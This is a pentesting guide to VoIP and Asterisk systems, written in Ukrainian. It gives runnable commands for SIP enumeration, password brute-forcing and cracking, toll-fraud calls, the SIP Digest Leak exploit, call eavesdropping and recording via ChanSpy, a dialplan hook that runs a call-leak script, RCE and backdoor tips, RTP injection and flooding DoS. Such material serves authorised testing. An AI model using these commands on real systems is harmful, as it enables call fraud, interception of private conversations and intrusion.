# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}

## VoIP Основна Інформація

Щоб почати вивчати, як працює VoIP, перегляньте:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Основні Повідомлення
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx—Проміжні відповіді**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Успішні відповіді**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Відповіді на перенаправлення**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Відповіді про помилки клієнта**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Відповіді про збій сервера**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Глобальні відповіді на помилки**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

Одним з перших кроків, які може зробити Red Team, є пошук доступних телефонних номерів для зв'язку з компанією, використовуючи інструменти OSINT, пошук в Google або сканування веб-сторінок.

Коли у вас є телефонні номери, ви можете використовувати онлайн-сервіси для ідентифікації оператора:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Знаючи, чи надає оператор послуги VoIP, ви можете визначити, чи використовує компанія VoIP... Більше того, можливо, що компанія не наймала послуги VoIP, але використовує PSTN карти для підключення свого VoIP PBX до традиційної телефонної мережі.

Такі речі, як автоматизовані відповіді з музикою, зазвичай вказують на те, що використовується VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT інформація

Будь-яка інша OSINT-енумерація, яка допомагає ідентифікувати використовуване VoIP програмне забезпечення, буде корисною для Red Team.

### Перерахування мережі

- **`nmap`** здатний сканувати UDP-сервіси, але через велику кількість UDP-сервісів, які скануються, це дуже повільно і може бути не дуже точним для такого роду сервісів.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** з SIPVicious (`sudo apt install sipvicious`): Знайде SIP-сервіси в зазначеній мережі.
- `svmap` **легко заблокувати**, оскільки він використовує User-Agent `friendly-scanner`, але ви можете змінити код з `/usr/share/sipvicious/sipvicious` і змінити його.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS сканер - це дуже швидкий сканер для SIP сервісів через UDP, TCP або TLS. Він використовує багатопоточність і може сканувати великі діапазони мереж. Він дозволяє легко вказати діапазон портів, сканувати як TCP, так і UDP, використовувати інший метод (за замовчуванням буде використовувати OPTIONS) та вказувати інший User-Agent (і не тільки).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Додаткова мережна енумерація

PBX також може відкривати інші мережеві сервіси, такі як:

- **69/UDP (TFTP)**: Оновлення прошивки
- **80 (HTTP) / 443 (HTTPS)**: Для управління пристроєм з вебу
- **389 (LDAP)**: Альтернатива для зберігання інформації про користувачів
- **3306 (MySQL)**: База даних MySQL
- **5038 (Manager)**: Дозволяє використовувати Asterisk з інших платформ
- **5222 (XMPP)**: Повідомлення за допомогою Jabber
- **5432 (PostgreSQL)**: База даних PostgreSQL
- І інші...

### Енумерація методів

Можливо знайти **які методи доступні** для використання в PBX, використовуючи `SIPPTS enumerate` з [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Аналіз відповідей сервера

Дуже важливо аналізувати заголовки, які сервер надсилає нам у відповідь, залежно від типу повідомлення та заголовків, які ми надсилаємо. За допомогою `SIPPTS send` з [**sippts**](https://github.com/Pepelux/sippts) ми можемо надсилати персоналізовані повідомлення, маніпулюючи всіма заголовками, і аналізувати відповідь.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Також можливо отримати дані, якщо сервер використовує вебсокети. З `SIPPTS wssend` з [**sippts**](https://github.com/Pepelux/sippts) ми можемо надсилати персоналізовані WS повідомлення.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeration розширень

Розширення в системі PBX (Приватна Автоматична Обмінна Станція) відносяться до **унікальних внутрішніх ідентифікаторів, призначених окремим** телефонним лініям, пристроям або користувачам в організації чи бізнесі. Розширення дозволяють **ефективно маршрутизувати дзвінки в межах організації**, без необхідності в індивідуальних зовнішніх телефонних номерах для кожного користувача або пристрою.

- **`svwar`** з SIPVicious (`sudo apt install sipvicious`): `svwar` є безкоштовним сканером ліній розширень SIP PBX. За концепцією він працює подібно до традиційних вордалікерів, **вгадуючи діапазон розширень або заданий список розширень**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten ідентифікує розширення на SIP сервері. Sipexten може перевіряти великі мережі та діапазони портів.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: Ви також можете перерахувати розширення/імена користувачів за допомогою metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** є протоколом Inter Asterisk Exchange **перебору імен користувачів методом грубої сили**. enumIAX може працювати в двох різних режимах: послідовне вгадування імен користувачів або атака за словником.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP Атаки

### Password Brute-Force - онлайн

Виявивши **PBX** та деякі **розширення/імена користувачів**, Червона Команда може спробувати **автентифікуватися через метод `REGISTER`** до розширення, використовуючи словник загальних паролів для брутфорсу автентифікації.

> [!CAUTION]
> Зверніть увагу, що **ім'я користувача** може бути таким же, як і розширення, але ця практика може варіюватися в залежності від системи PBX, її конфігурації та уподобань організації...
>
> Якщо ім'я користувача не таке ж, як і розширення, вам потрібно буде **з'ясувати ім'я користувача для брутфорсу**.

- **`svcrack`** з SIPVicious (`sudo apt install sipvicious`): SVCrack дозволяє вам зламати пароль для конкретного імені користувача/розширення на PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack - це віддалений злому паролів для SIP-сервісів. Rcrack може перевіряти паролі для кількох користувачів на різних IP-адресах і діапазонах портів.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

Якщо ви знайдете VoIP обладнання всередині **Open Wifi network**, ви зможете **перехопити всю інформацію**. Більше того, якщо ви знаходитесь у більш закритій мережі (підключеній через Ethernet або захищеній Wifi), ви зможете виконати **MitM атаки, такі як** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) між **PBX та шлюзом**, щоб перехопити інформацію.

Серед мережевої інформації ви можете знайти **веб-облікові дані** для управління обладнанням, **розширення** користувачів, **ім'я користувача**, **IP** адреси, навіть **хешовані паролі** та **RTP пакети**, які ви можете відтворити, щоб **почути розмову**, і більше.

Щоб отримати цю інформацію, ви можете використовувати інструменти, такі як Wireshark, tcpdump... але **спеціально створений інструмент для перехоплення VoIP розмов - це** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Зверніть увагу, що якщо **TLS використовується в SIP комунікації**, ви не зможете бачити SIP комунікацію в чистому вигляді.\
> Те ж саме станеться, якщо використовується **SRTP** та **ZRTP**, **RTP пакети не будуть у відкритому тексті**.

#### SIP credentials (Password Brute-Force - offline)

[Перегляньте цей приклад, щоб краще зрозуміти **SIP REGISTER комунікацію**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), щоб дізнатися, як **надсилаються облікові дані**.

- **`sipdump`** & **`sipcrack`,** частина **sipcrack** (`apt-get install sipcrack`): Ці інструменти можуть **екстрагувати** з **pcap** **digest аутентифікації** в рамках SIP протоколу та **зламувати** їх.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump може витягувати автентифікації digest з файлу pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack - це інструмент для злому автентифікацій digest, отриманих за допомогою SIPPTS dump.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark витягує дані протоколу SIP з файлу PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF коди

**Не тільки SIP облікові дані** можна знайти в мережевому трафіку, також можливо знайти DTMF коди, які використовуються, наприклад, для доступу до **голосової пошти**.\
Ці коди можна відправляти в **INFO SIP повідомленнях**, в **аудіо** або всередині **RTP пакетів**. Якщо коди знаходяться всередині RTP пакетів, ви можете вирізати цю частину розмови і використовувати інструмент multimo для їх витягнення:
```bash
multimon -a DTMF -t wac pin.wav
```
### Безкоштовні дзвінки / Неправильні налаштування з'єднань Asterisk

В Asterisk можливо дозволити з'єднання **з конкретної IP-адреси** або **з будь-якої IP-адреси**:
```
host=10.10.10.10
host=dynamic
```
Якщо вказана IP-адреса, хост **не потрібно буде надсилати REGISTER** запити час від часу (в пакеті REGISTER надсилається час життя, зазвичай 30 хвилин, що означає, що в іншому випадку телефон повинен буде РЕГІСТРУВАТИСЯ кожні 30 хвилин). Однак, йому потрібно мати відкриті порти, що дозволяють з'єднання з VoIP сервером для прийому дзвінків.

Щоб визначити користувачів, їх можна визначити як:

- **`type=user`**: Користувач може отримувати дзвінки лише як користувач.
- **`type=friend`**: Можливо здійснювати дзвінки як рівний і отримувати їх як користувач (використовується з розширеннями)
- **`type=peer`**: Можливо надсилати та отримувати дзвінки як рівний (SIP-транки)

Також можливо встановити довіру з використанням змінної insecure:

- **`insecure=port`**: Дозволяє з'єднання рівних, перевірених за IP.
- **`insecure=invite`**: Не вимагає аутентифікації для INVITE повідомлень
- **`insecure=port,invite`**: Обидва

> [!WARNING]
> Коли використовується **`type=friend`**, **значення** змінної **host** **не буде використано**, тому якщо адміністратор **неправильно налаштує SIP-транк**, **будь-хто зможе підключитися до нього**.
>
> Наприклад, ця конфігурація буде вразливою:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Безкоштовні дзвінки / Неправильні налаштування контексту Asterisk

У Asterisk **контекст** - це іменований контейнер або секція в плані набору, яка **групує пов'язані розширення, дії та правила**. План набору є основним компонентом системи Asterisk, оскільки він визначає, **як обробляються та маршрутизуються вхідні та вихідні дзвінки**. Контексти використовуються для організації плану набору, управління контролем доступу та забезпечення розділення між різними частинами системи.

Кожен контекст визначається в конфігураційному файлі, зазвичай у файлі **`extensions.conf`**. Контексти позначаються квадратними дужками, з іменем контексту, що міститься всередині них. Наприклад:
```bash
csharpCopy code[my_context]
```
У контексті ви визначаєте розширення (шаблони набраних номерів) та асоціюєте їх з серією дій або додатків. Ці дії визначають, як обробляється дзвінок. Наприклад:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Цей приклад демонструє простий контекст під назвою "my_context" з розширенням "100". Коли хтось набирає 100, дзвінок буде прийнято, буде програно вітальне повідомлення, а потім дзвінок буде завершено.

Це **інший контекст**, який дозволяє **дзвонити на будь-який інший номер**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Якщо адміністратор визначає **за замовчуванням контекст** як:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Будь-хто зможе використовувати **сервер для дзвінків на будь-який інший номер** (і адміністратор сервера заплатить за дзвінок).

> [!CAUTION]
> Більше того, за замовчуванням файл **`sip.conf`** містить **`allowguest=true`**, тоді **будь-який** attacker без **автентифікації** зможе дзвонити на будь-який інший номер.

- **`SIPPTS invite`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite перевіряє, чи **PBX сервер дозволяє нам здійснювати дзвінки без автентифікації**. Якщо SIP сервер має неправильну конфігурацію, він дозволить нам здійснювати дзвінки на зовнішні номери. Це також може дозволити нам переадресувати дзвінок на другий зовнішній номер.

Наприклад, якщо ваш сервер Asterisk має погану конфігурацію контексту, ви можете приймати запити INVITE без авторизації. У цьому випадку attacker може здійснювати дзвінки, не знаючи жодного user/pass.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Безкоштовні дзвінки / Неправильно налаштовані IVRS

IVRS означає **Систему інтерактивної голосової відповіді**, технологію телефонії, яка дозволяє користувачам взаємодіяти з комп'ютеризованою системою через голосові або тональні введення. IVRS використовується для створення **автоматизованих систем обробки дзвінків**, які пропонують ряд функцій, таких як надання інформації, маршрутизація дзвінків та захоплення введення користувача.

IVRS у системах VoIP зазвичай складається з:

1. **Голосових підказок**: Попередньо записані аудіоповідомлення, які направляють користувачів через варіанти меню IVR та інструкції.
2. **DTMF** (Dual-Tone Multi-Frequency) сигналізація: Тональні введення, що генеруються натисканням клавіш на телефоні, які використовуються для навігації через меню IVR та надання введення.
3. **Маршрутизація дзвінків**: Направлення дзвінків до відповідного призначення, такого як конкретні відділи, агенти або розширення на основі введення користувача.
4. **Захоплення введення користувача**: Збір інформації від абонентів, такої як номери рахунків, ID справ або будь-які інші відповідні дані.
5. **Інтеграція з зовнішніми системами**: Підключення системи IVR до баз даних або інших програмних систем для доступу або оновлення інформації, виконання дій або ініціювання подій.

У системі VoIP Asterisk ви можете створити IVR, використовуючи план набору (**`extensions.conf`** файл) та різні програми, такі як `Background()`, `Playback()`, `Read()` та інші. Ці програми допомагають вам відтворювати голосові підказки, захоплювати введення користувача та контролювати потік дзвінків.

#### Приклад вразливої конфігурації
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Попередній приклад, де користувача просять **натиснути 1, щоб зателефонувати** в відділ, **2, щоб зателефонувати** в інший, або **повний номер**, якщо він його знає.\
Вразливість полягає в тому, що вказана **довжина номера не перевіряється, тому користувач може ввести тайм-аут 5 секунд з повним номером, і він буде набраний.**

### Впровадження номера

Використовуючи номер, такий як:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Де **`${EXTEN}`** є **розширенням**, яке буде викликано, коли **введено ext 101**, це те, що станеться:
```scss
exten => 101,1,Dial(SIP/101)
```
Однак, якщо **`${EXTEN}`** дозволяє вводити **більше ніж цифри** (як у старіших версіях Asterisk), зловмисник може ввести **`101&SIP123123123`**, щоб зателефонувати на номер 123123123. І це буде результат:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Тому дзвінок на розширення **`101`** та **`123123123`** буде надіслано, і лише перший, хто отримав дзвінок, буде встановлено... але якщо зловмисник використовує **розширення, яке обходить будь-яке зіставлення**, яке виконується, але не існує, він може **інжектувати дзвінок лише на бажаний номер**.

## Уразливість SIPDigestLeak

Уразливість SIP Digest Leak впливає на велику кількість SIP телефонів, включаючи як апаратні, так і програмні IP телефони, а також телефонні адаптери (VoIP на аналогові). Уразливість дозволяє **витікання відповіді на аутентифікацію Digest**, яка обчислюється з пароля. **Офлайн-атака на пароль стає можливою** і може відновити більшість паролів на основі відповіді на виклик.

**[Сценарій уразливості звідси**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP телефон (жертва) слухає на будь-якому порту (наприклад: 5060), приймаючи телефонні дзвінки
2. Зловмисник надсилає INVITE на IP телефон
3. Телефон жертви починає дзвонити, і хтось піднімає слухавку і кладе трубку (оскільки ніхто не відповідає на телефон на іншому кінці)
4. Коли телефон кладе трубку, **телефон жертви надсилає BYE зловмиснику**
5. **Зловмисник видає відповідь 407**, яка **питає про аутентифікацію** і видає виклик на аутентифікацію
6. **Телефон жертви надає відповідь на виклик аутентифікації** в другому BYE
7. **Зловмисник може тоді здійснити атаку методом грубої сили** на відповідь на виклик на своєму локальному комп'ютері (або розподіленій мережі тощо) і вгадати пароль

- **SIPPTS leak** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leak експлуатує уразливість SIP Digest Leak, яка впливає на велику кількість SIP телефонів. Вихід може бути збережений у форматі SipCrack для брутфорсу за допомогою SIPPTS dcrack або інструменту SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call дозволяє **веб-користувачу** (який, наприклад, може бути зацікавлений у продукті) **ввести** свій **номер телефону**, щоб отримати дзвінок. Потім буде здійснено дзвінок на комерційний номер, і коли він **підніме слухавку**, користувач буде **позначений і з'єднаний з агентом**.

Звичайний профіль Asterisk для цього виглядає так:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- Попередній профіль дозволяє **БУДЬ-ЯКІЙ IP-адресі підключатися** (якщо відома пароль).
- Для **організації дзвінка**, як зазначено раніше, **необхідні права на читання** і **тільки** **оригінування** в **запис** є необхідними.

З цими правами будь-який IP, що знає пароль, може підключитися і витягнути занадто багато інформації, наприклад:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Більше інформації або дій може бути запитано.**

### **Прослуховування**

В Asterisk можливо використовувати команду **`ChanSpy`**, вказуючи **розширення(я) для моніторингу** (або всі з них), щоб чути розмови, які відбуваються. Цю команду потрібно призначити розширенню.

Наприклад, **`exten => 333,1,ChanSpy('all',qb)`** вказує, що якщо ви **зателефонуєте** на **розширення 333**, воно буде **моніторити** **`всі`** розширення, **почне слухати** щоразу, коли починається нова розмова (**`b`**) в тихому режимі (**`q`**), оскільки ми не хочемо взаємодіяти з цим. Ви можете переходити від однієї розмови до іншої, натискаючи **`*`**, або набираючи номер розширення.

Також можливо використовувати **`ExtenSpy`** для моніторингу лише одного розширення.

Замість того, щоб слухати розмови, можливо **записувати їх у файли**, використовуючи розширення, такі як:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
Дзвінки будуть збережені в **`/tmp`**.

Ви також можете змусити Asterisk **виконати скрипт, який витече дзвінок** після його закриття.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Уразливість RTCPBleed

**RTCPBleed** є серйозною проблемою безпеки, що впливає на VoIP-сервери на базі Asterisk (опубліковано в 2017 році). Уразливість дозволяє **RTP (Real Time Protocol) трафіку**, який несе VoIP-розмови, **перехоплюватися та перенаправлятися будь-ким в Інтернеті**. Це відбувається тому, що RTP-трафік обходить аутентифікацію при навігації через NAT (Network Address Translation) брандмауери.

RTP-проксі намагаються вирішити **обмеження NAT**, що впливають на RTC-системи, проксуючи RTP-потоки між двома або більше сторонами. Коли NAT активний, програмне забезпечення RTP-проксі часто не може покладатися на інформацію про IP та порт RTP, отриману через сигналізацію (наприклад, SIP). Тому ряд RTP-проксі реалізували механізм, де такий **IP та порт автоматично вивчаються**. Це часто робиться шляхом перевірки вхідного RTP-трафіку та позначення IP та порту джерела для будь-якого вхідного RTP-трафіку як того, на який слід відповідати. Цей механізм, який може називатися "режим навчання", **не використовує жодного виду аутентифікації**. Тому **зловмисники** можуть **надсилати RTP-трафік до RTP-проксі** та отримувати проксований RTP-трафік, призначений для абонента або абонентки поточного RTP-потоку. Ми називаємо цю уразливість RTP Bleed, оскільки вона дозволяє зловмисникам отримувати RTP медіа-потоки, призначені для законних користувачів.

Ще одна цікава особливість RTP-проксі та стеків RTP полягає в тому, що іноді, **навіть якщо не вразливі до RTP Bleed**, вони **приймають, пересилають та/або обробляють RTP-пакети з будь-якого джерела**. Тому зловмисники можуть надсилати RTP-пакети, що можуть дозволити їм інжектувати своє медіа замість законного. Ми називаємо цю атаку RTP injection, оскільки вона дозволяє інжекцію нелегітимних RTP-пакетів у існуючі RTP-потоки. Цю уразливість можна знайти як у RTP-проксі, так і в кінцевих точках.

Asterisk та FreePBX традиційно використовували **`NAT=yes` налаштування**, яке дозволяє RTP-трафіку обходити аутентифікацію, що потенційно призводить до відсутності звуку або одностороннього звуку під час дзвінків.

Для отримання додаткової інформації перегляньте [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed виявляє уразливість RTP Bleed, надсилаючи RTP-потоки.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed виявляє вразливість RTP Bleed, надсилаючи RTCP потоки.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood експлуатує вразливість RTP Bleed, надсилаючи RTP потоки.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** з [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject експлуатує вразливість RTP Bleed, інжектуючи аудіофайл (формат WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

В Asterisk ви якимось чином можете **додати правила розширення та перезавантажити їх** (наприклад, зламавши вразливий веб-менеджер), можливо отримати RCE, використовуючи команду **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Є команда під назвою **`Shell`**, яка може бути використана **замість `System`** для виконання системних команд, якщо це необхідно.

> [!WARNING]
> Якщо сервер **не дозволяє використання певних символів** у команді **`System`** (як у Elastix), перевірте, чи веб-сервер дозволяє **створювати файли якимось чином всередині системи** (як у Elastix або trixbox), і використайте це для **створення скрипту з бекдором**, а потім використайте **`System`** для **виконання** цього **скрипту**.

#### Цікаві локальні файли та дозволи

- **`sip.conf`** -> Містить пароль користувачів SIP.
- Якщо **сервер Asterisk працює як root**, ви можете скомпрометувати root.
- **mysql root user** може **не мати жодного пароля**.
- це може бути використано для створення нового користувача mysql як бекдор.
- **`FreePBX`**
- **`amportal.conf`** -> Містить пароль адміністратора веб-панелі (FreePBX).
- **`FreePBX.conf`** -> Містить пароль користувача FreePBXuser, який використовується для доступу до бази даних.
- це може бути використано для створення нового користувача mysql як бекдор.
- **`Elastix`**
- **`Elastix.conf`** -> Містить кілька паролів у відкритому тексті, таких як пароль mysql root, пароль IMAPd, пароль веб-адміністратора.
- **Кілька папок** належатимуть скомпрометованому користувачу asterisk (якщо не працює як root). Цей користувач може читати попередні файли та також контролює конфігурацію, тому він може змусити Asterisk завантажувати інші скомпрометовані бінарні файли під час виконання.

### Впровадження RTP

Можливо вставити **`.wav`** у розмови, використовуючи інструменти, такі як **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) та **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Або ви можете використовувати скрипти з [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) для **сканування розмов** (**`rtpscan.pl`**), відправки `.wav` у розмову (**`rtpsend.pl`**) та **вставки шуму** у розмову (**`rtpflood.pl`**).

### DoS

Існує кілька способів спробувати досягти DoS на VoIP серверах.

- **`SIPPTS flood`** з [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood надсилає необмежену кількість повідомлень до цілі.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** з [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping робить SIP ping, щоб перевірити час відповіді сервера.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS протоколу IAX, що використовується Asterisk.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Інструмент для виконання затоплення повідомлень SIP/SDP INVITE через UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Надсилає кілька добре сформованих RTP пакетів. Потрібно знати RTP порти, які використовуються (спочатку прослухайте).
